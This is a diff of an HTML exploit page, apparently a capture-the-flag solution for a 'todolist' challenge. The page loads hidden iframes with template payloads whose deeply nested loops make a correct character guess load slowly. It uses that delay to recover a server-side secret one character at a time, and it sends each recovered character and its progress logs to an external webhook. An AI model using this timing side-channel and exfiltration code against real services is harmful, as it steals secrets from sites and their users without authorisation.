@@ -1,63 +1,116 @@
 <!DOCTYPE html>
-<html>
+<html><head><meta charset="utf-8"><title>.</title></head><body>
+<pre id="log"></pre>
 <script>
-const WEBHOOK = "https://webhook.site/591468f2-6ec6-4310-a0b1-0837b7ef0608";
-const CHALL   = "https://todolist.challs.srdnlen.it/";
-const CHARSET = 'srdnlen{}_abcdefghijklmnopqrstuvwxyz0123456789';
-const THRESHOLD = 5000;
-const LOOPS = 7;
-const ARR = '[0,1,2,3,4,5,6,7,8,9,10]';
+// ── CONFIG ────────────────────────────────────────────────────────────────────
+const TARGET   = "https://todolist.challs.srdnlen.it";
+const WEBHOOK  = "https://webhook.site/591468f2-6ec6-4310-a0b1-0837b7ef0608";
+const PREFIX   = "srdnlen{leakycs";   // <-- update this as you find chars
+const CHARSET  = "abcdefghijklmnopqrstuvwxyz_0123456789}";
+const ARRLEN   = 11;
+const DEPTH    = 7;
+const P_TO     = 900;   // ms — no-match loads ~200ms, match hangs to P_TO
+const BUDGET   = 54000; // ms total (bot has 60s, leave buffer)
+// ─────────────────────────────────────────────────────────────────────────────
 
-function makeUrl(pos, char) {
-  const open  = '{{#each @root.arr}}'.repeat(LOOPS);
-  const close = '{{/each}}'.repeat(LOOPS);
-  const tpl = `{{#if (eq (lookup secret ${pos}) "${char}")}}${open}X${close}{{/if}}`;
-  return CHALL + '?data=' + encodeURIComponent(`{"arr":${ARR}}`) 
-       + '&template=' + encodeURIComponent(tpl);
+const ARR  = JSON.stringify(Array.from({length:ARRLEN},(_,i)=>i));
+const OPEN = "{{#each @root.arr}}".repeat(DEPTH);
+const CLOS = "{{/each}}".repeat(DEPTH);
+
+const log = document.getElementById("log");
+function print(msg) {
+  log.textContent += msg + "\n";
+  fetch(`${WEBHOOK}?log=${encodeURIComponent(msg)}`).catch(()=>{});
 }
 
-function probe(pos, char) {
+function makeUrl(pos, ch) {
+  const tpl = `{{#if (eq (lookup secret ${pos}) "${ch}")}}${OPEN}X${CLOS}{{/if}}`;
+  return TARGET + "/?data=" + encodeURIComponent(`{"arr":${ARR}}`)
+       + "&template=" + encodeURIComponent(tpl);
+}
+
+// Probe all chars in parallel — returns {char: ms} map
+function probeAll(pos) {
   return new Promise(resolve => {
-    const f = document.createElement('iframe');
-    f.style = 'width:1px;height:1px;position:fixed;top:-999px';
-    const t0 = Date.now();
-    const timeout = setTimeout(() => {
-      f.remove();
-      resolve({ char, ms: Date.now()-t0, hit: true });
-    }, THRESHOLD + 2000);
-    f.onload = () => {
-      clearTimeout(timeout);
-      f.remove();
-      const ms = Date.now()-t0;
-      resolve({ char, ms, hit: ms > THRESHOLD });
-    };
-    f.src = makeUrl(pos, char);
-    document.body.appendChild(f);
+    const results = {};
+    let remaining = CHARSET.length;
+
+    CHARSET.split("").forEach(ch => {
+      const f = document.createElement("iframe");
+      f.style = "width:1px;height:1px;position:fixed;top:-9999px;left:-9999px";
+      const t0 = Date.now();
+
+      const tid = setTimeout(() => {
+        results[ch] = Date.now() - t0; // timed out = MATCH
+        f.src = "about:blank";
+        try { f.remove(); } catch(e) {}
+        if (--remaining === 0) resolve(results);
+      }, P_TO);
+
+      f.onload = () => {
+        clearTimeout(tid);
+        results[ch] = Date.now() - t0; // loaded fast = no match
+        try { f.remove(); } catch(e) {}
+        if (--remaining === 0) resolve(results);
+      };
+
+      f.src = makeUrl(pos, ch);
+      document.body.appendChild(f);
+    });
   });
 }
 
-async function exfil() {
-  await fetch(WEBHOOK + '?status=start');
-  let flag = 'srdnlen{';
+async function run() {
+  const t0 = Date.now();
+  print(`[start] prefix=${PREFIX}`);
 
-  for (let pos = flag.length; pos < 50; pos++) {
-    let found = false;
-    for (const char of CHARSET) {
-      const r = await probe(pos, char);
-      // ping webhook on every attempt so you see live progress
-      await fetch(`${WEBHOOK}?pos=${pos}&c=${encodeURIComponent(char)}&ms=${r.ms}&flag=${encodeURIComponent(flag)}`);
-      if (r.hit) {
-        flag += char;
-        await fetch(`${WEBHOOK}?HIT&flag=${encodeURIComponent(flag)}`);
-        if (char === '}') { await fetch(WEBHOOK + '?DONE&flag=' + encodeURIComponent(flag)); return; }
-        found = true;
+  let flag = PREFIX;
+
+  for (let pos = PREFIX.length; pos < 60; pos++) {
+    const elapsed = Date.now() - t0;
+    if (elapsed > BUDGET) {
+      print(`[budget] stopping at pos ${pos} after ${elapsed}ms`);
+      break;
+    }
+
+    print(`[pos ${pos}] scanning... (${elapsed}ms elapsed)`);
+    const results = await probeAll(pos);
+
+    // Find the slowest char
+    const ranked = Object.entries(results).sort((a,b) => b[1]-a[1]);
+    const [bestChar, bestMs] = ranked[0];
+    const [, secondMs]       = ranked[1] || ["", 1];
+
+    // Log top 3
+    const top3 = ranked.slice(0,3).map(([c,d])=>`'${c}'=${d}ms`).join("  |  ");
+    print(`[pos ${pos}] top3: ${top3}`);
+
+    if (bestMs >= P_TO) {
+      // Timed out = definite match
+      flag += bestChar;
+      print(`[HIT] pos=${pos} char='${bestChar}' dt=${bestMs}ms  →  FLAG: ${flag}`);
+      fetch(`${WEBHOOK}?HIT&pos=${pos}&char=${encodeURIComponent(bestChar)}&flag=${encodeURIComponent(flag)}`).catch(()=>{});
+      if (bestChar === "}") break;
+    } else {
+      // Nothing timed out — try with ratio heuristic
+      if (bestMs > 400 && bestMs / Math.max(1, secondMs) > 2.5) {
+        flag += bestChar;
+        print(`[HIT?] pos=${pos} char='${bestChar}' ratio=${(bestMs/Math.max(1,secondMs)).toFixed(1)}x  →  FLAG: ${flag}`);
+        fetch(`${WEBHOOK}?HIT_RATIO&pos=${pos}&char=${encodeURIComponent(bestChar)}&flag=${encodeURIComponent(flag)}`).catch(()=>{});
+        if (bestChar === "}") break;
+      } else {
+        print(`[MISS] pos=${pos} best='${bestChar}'@${bestMs}ms — char not in charset?`);
+        fetch(`${WEBHOOK}?MISS&pos=${pos}&flag=${encodeURIComponent(flag)}&best=${encodeURIComponent(bestChar)}&ms=${bestMs}`).catch(()=>{});
         break;
       }
     }
-    if (!found) { await fetch(WEBHOOK + '?stuck&pos=' + pos); break; }
   }
+
+  const done = `[DONE] FLAG=${flag}  total=${Date.now()-t0}ms`;
+  print(done);
+  fetch(`${WEBHOOK}?DONE&flag=${encodeURIComponent(flag)}`).catch(()=>{});
 }
 
-exfil();
+run();
 </script>
-</html>
+</body></html>
